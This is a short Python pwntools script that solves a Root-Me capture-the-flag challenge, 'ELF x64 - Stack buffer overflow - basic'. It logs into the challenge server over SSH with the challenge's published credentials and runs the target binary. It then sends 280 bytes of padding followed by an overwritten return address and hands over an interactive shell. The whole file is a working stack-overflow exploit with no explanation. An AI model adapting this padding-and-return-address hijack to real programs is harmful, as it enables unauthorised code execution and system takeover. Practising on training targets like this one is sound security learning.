#!/usr/bin/env python
from pwn import *

payload = "A" * 280 + "\xd6\x06\x40\x00\x00"

shell = ssh('app-systeme-ch35', 'challenge03.root-me.org', password='app-systeme-ch35', port=2223)

p = shell.run('./ch35')

p.sendline(payload)

p.interactive()

shell.close()

# ELF x64 - Stack buffer overflow - basic
